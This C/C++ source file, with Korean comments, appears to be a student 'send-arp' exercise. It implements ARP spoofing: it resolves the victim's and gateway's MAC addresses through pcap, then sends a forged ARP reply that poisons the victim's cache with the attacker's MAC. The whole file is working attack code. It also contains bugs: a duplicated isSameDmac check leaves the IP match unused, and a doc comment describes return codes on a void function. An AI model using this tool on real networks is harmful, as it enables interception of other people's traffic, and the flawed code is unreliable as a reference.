#include "functions.h"

/// MAC 주소 길이
#define MAC_ALEN 6
#define IP_ALEN 4

/// MAC 주소 출력 매크로
#define MAC_ADDR_FMT "%02X:%02X:%02X:%02X:%02X:%02X" 
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

/**
 * @brief 네트워크 인터페이스의 MAC 주소를 확인한다.
 *
 * @param[in] ifname        네트워크 인터페이스 이름
 * @param[in] mac_addr      MAC 주소가 저장될 버퍼 (6바이트 길이)
 * 
 * @retval  0: 성공
 * @retval  -1: 실패
 */
void GetInterfaceMacAddress(char *ifname, uint8_t *mac_addr, uint32_t *ip_addr)
{
  struct ifreq ifr;
  int sockfd, ret;

  // printf("Get interface(%s) MAC address\n", ifname);

  /*
   * 네트워크 인터페이스 소켓을 연다.
   */
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0) {
    printf("Fail to get interface MAC address - socket() failed - %m\n");
    return;
  }

  /*
   * 네트워크 인터페이스의 MAC 주소를 확인한다.
   */
  strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
  ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
  if (ret < 0) {
    printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
    close(sockfd);
    return;
  }
  memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

  /* 내가 보고 구현한 부분
   * 네트워크 인터페이스의 IP 주소를 확인한다.
   */
  ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
  if (ret < 0) {
    printf("Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
    close(sockfd);
    return;
  }
  struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
  *ip_addr = sin->sin_addr.s_addr;

  close(sockfd);

  // printf("Success to get interface(%s) MAC address as "MAC_ADDR_FMT"\n", ifname, MAC_ADDR_FMT_ARGS(mac_addr));
  // printf("IP : %s\n", inet_ntoa(temp));
}


// 이하로는 직접 구현한 함수 목록

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void requestARPforMACAddr(Mac smac, Mac dmac, Ip sip, Mac tmac, Ip tip, Mac *replySmac, pcap_t *handle) {
	// 목적 : ARP 패킷을 만들어서 보내고, 응답 패킷을 Eth의 dmac과 ARP의 tip, sip으로 비교하여 smac을 얻어낸다.

	EthArpPacket packet;

	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;

		int res2 = pcap_next_ex(handle, &header, &packet);
		if (res2 == 0) continue;
		if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
			break;
		}

		// ARP check
		EthHdr *_ethHdr = (EthHdr*)packet;

		bool isArpPacket = _ethHdr->type_ == ntohs(0x0806);
		if(!isArpPacket) continue;

		EthArpPacket *_ethArpPacket = (EthArpPacket*)packet;

		// Reply check
		bool isReplyPacket = _ethArpPacket->arp_.op_ == htons(ArpHdr::Reply);
		if(!isReplyPacket) continue;

		// dmac & sip check
		bool isSameDmac = _ethArpPacket->eth_.dmac_ == (smac);
		bool isSameSip = ntohl(_ethArpPacket->arp_.sip_) == htonl(tip);
		if(!isSameDmac || !isSameDmac) continue;

		// Return Smac
		*replySmac = _ethArpPacket->eth_.smac_;
		return;
	}
}

void replyARPforSpoofing(Mac smac, Mac dmac, Ip sip, Mac tmac, Ip tip, pcap_t *handle) {

	EthArpPacket packet;

	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void arpSpoofing(char * senderIPString, char * targetIPString, char *dev, pcap_t *handle) {
  	Ip senderIPAddr;
	Ip targetIPAddr;
	Ip attackerIPAddr;

	Mac senderMACAddr;
	Mac targetMACAddr;
	Mac attackerMACAddr;

	// Sender & Target IP 등록
	senderIPAddr = Ip(senderIPString);
	targetIPAddr = Ip(targetIPString);

	// Attacker의 MAC주소와 IP주소를 가져오기
	uint8_t mac_addr[6];
	in_addr ip_addr; 
	GetInterfaceMacAddress(dev, mac_addr, &(ip_addr.s_addr));
	attackerMACAddr = Mac(mac_addr);
	attackerIPAddr = Ip(inet_ntoa(ip_addr));

	// ARP Packet을 보내서, Gateway와, Sender의 MAC 주소를 가져오기
	requestARPforMACAddr(attackerMACAddr, Mac("FF:FF:FF:FF:FF:FF"), attackerIPAddr, Mac("00:00:00:00:00:00"), targetIPAddr, &targetMACAddr, handle);
	requestARPforMACAddr(attackerMACAddr, Mac("FF:FF:FF:FF:FF:FF"), attackerIPAddr, Mac("00:00:00:00:00:00"), senderIPAddr, &senderMACAddr, handle);
	
	// ARP spoofing진행
	replyARPforSpoofing(attackerMACAddr, senderMACAddr, targetIPAddr, senderMACAddr, senderIPAddr, handle);
}